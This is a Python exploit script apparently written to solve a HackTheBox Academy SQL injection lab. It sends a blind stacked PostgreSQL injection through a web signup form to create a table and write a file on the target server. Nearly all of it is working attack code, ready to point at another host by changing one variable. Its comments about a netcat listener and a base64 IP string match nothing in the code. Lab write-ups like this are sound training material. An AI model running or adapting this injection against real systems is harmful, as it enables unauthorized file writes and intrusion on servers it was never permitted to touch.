#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' for the module called 'Advanced SQL Injections'. 
This script exploits a blind stacked postgreSQL injection to write a file on the target server.
Open a netcat listener for port 4444 before running the script
"""

import random
import string
import requests

target= "10.129.204.249:8080" # Change this
proxies= {"http":"http://127.0.0.1:8081"} # Change this
headers= {"Content-Type": "application/x-www-form-urlencoded"}

def generate_random_word():
    all_chars= string.digits + string.ascii_letters
    random_group = random.sample(all_chars, 16)
    return ''.join(random_group)

random_group = generate_random_word()
   
# Update the IP address in the base64 string before running the script.
payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$testing$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';"

data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload};--+-&email={random_group}@a.com&password=test&repeatPassword=test"

response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
